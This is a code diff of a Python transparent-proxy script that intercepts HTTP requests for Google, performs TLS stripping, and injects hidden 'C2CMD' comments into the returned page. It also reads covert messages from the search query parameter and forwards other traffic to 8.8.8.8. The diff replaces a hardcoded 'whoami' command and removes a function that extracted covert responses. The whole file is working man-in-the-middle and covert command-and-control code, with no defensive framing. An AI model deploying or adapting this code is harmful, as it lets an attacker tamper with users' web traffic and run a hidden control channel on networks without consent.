@@ -1,20 +1,23 @@
 import socket
 import threading
-import requests
-import re
 import ssl
+import re
+import urllib.parse
 
+# Listen on internal network
 INTERNAL_IP = "0.0.0.0"
 INTERNAL_PORT = 80
+
+# Target for interception
 TARGET_HOST = "www.google.com"
 
-# Covert command to inject into HTML
-COVERT_CMD = "whoami"
-
-def inject_command(content):
+def inject_command(content, command):
+    """
+    Insert a covert command into the HTML body as a hidden comment.
+    """
     try:
         html = content.decode(errors="ignore")
-        injection = f"<!-- C2CMD:{COVERT_CMD} -->"
+        injection = f"<!-- C2CMD:{command} -->"
         if "</body>" in html:
             html = html.replace("</body>", injection + "</body>")
         else:
@@ -23,17 +26,13 @@ def inject_command(content):
     except Exception:
         return content
 
-def extract_response(content):
-    try:
-        html = content.decode(errors="ignore")
-        match = re.search(r'<!-- C2RESP:(.*?) -->', html, re.DOTALL)
-        if match:
-            print(f"[+] Covert Response Extracted: {match.group(1).strip()}", flush=True)
-    except Exception:
-        pass
+
 
 def fetch_tls(host, path):
-    """Perform HTTPS request to Google and return raw content + headers."""
+    """
+    Perform a HTTPS GET request manually using sockets and SSL.
+    Returns raw HTTP response (headers + body).
+    """
     context = ssl.create_default_context()
     with socket.create_connection((host, 443)) as raw_sock:
         with context.wrap_socket(raw_sock, server_hostname=host) as tls_sock:
@@ -48,43 +47,61 @@ def fetch_tls(host, path):
     return response
 
 def handle_client(client_socket):
+    """
+    Handle a single client connection, inspect for Google HTTP requests,
+    perform TLS stripping, inject covert commands, and forward other traffic.
+    """
     try:
+        # Read client request
         request = client_socket.recv(4096)
         if not request:
             client_socket.close()
             return
 
-        # Decode HTTP request
         request_text = request.decode('utf-8', errors='replace')
 
-        # Intercept Google HTTP requests
-        if request_text.startswith(('GET ', 'POST ')) and f"Host: {TARGET_HOST}" in request_text:
+        # Detect Google HTTP request
+        if re.search(rf"Host:\s*{TARGET_HOST}", request_text, re.IGNORECASE):
             print("[+] Intercepted Google HTTP request", flush=True)
-
-            # Extract path
+            
+            # Extract the requested path (/search?q=...)
             first_line = request_text.split('\r\n')[0]
             path = first_line.split(' ')[1] if len(first_line.split(' ')) > 1 else '/'
 
-            # Perform TLS request to Google
+            # Parse query string to get covert message
+            parsed = urllib.parse.urlparse(path)
+            covert_message = urllib.parse.parse_qs(parsed.query).get('q', [''])[0]
+            print(f"[+] Covert message received: {covert_message}", flush=True)
+
+            # Fetch real page over HTTPS
             raw_response = fetch_tls(TARGET_HOST, path)
 
-            # Split headers/body
+            # Separate headers and body
             if b"\r\n\r\n" in raw_response:
-                header, body = raw_response.split(b"\r\n\r\n", 1)
+                header_bytes, body = raw_response.split(b"\r\n\r\n", 1)
             else:
-                header, body = raw_response, b""
+                header_bytes, body = raw_response, b""
 
-            # Inject command and extract response
-            body = inject_command(body)
-            extract_response(body)
+            # Inject covert command and check for covert response
+            body = inject_command(body, "pong!")
 
-            # Build final HTTP response for client
-            response = header + b"\r\n\r\n" + body
+            # Rebuild headers with corrected Content-Length
+            header_text = header_bytes.decode(errors="ignore")
+            # Remove existing Content-Length to avoid mismatch
+            filtered_headers = "\r\n".join(
+                h for h in header_text.split("\r\n")
+                if not h.lower().startswith("content-length")
+            )
+            response = (
+                f"{filtered_headers}\r\nContent-Length: {len(body)}\r\n\r\n"
+            ).encode() + body
+
+            # Send modified page back to client as plain HTTP
             client_socket.sendall(response)
             client_socket.close()
             return
 
-        # Otherwise, forward traffic
+        # Forward all other traffic unchanged (basic transparent proxy)
         print("[+] Forwarding non-Google traffic", flush=True)
         forward_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         forward_socket.connect(("8.8.8.8", 80))
@@ -103,11 +120,15 @@ def handle_client(client_socket):
         client_socket.close()
 
 def run_router():
+    """
+    Start the transparent proxy listening on port 80.
+    """
     router = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     router.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     router.bind((INTERNAL_IP, INTERNAL_PORT))
     router.listen(50)
     print(f"[+] Transparent router listening on port {INTERNAL_PORT}", flush=True)
+
     while True:
         client_sock, addr = router.accept()
         threading.Thread(target=handle_client, args=(client_sock,), daemon=True).start()
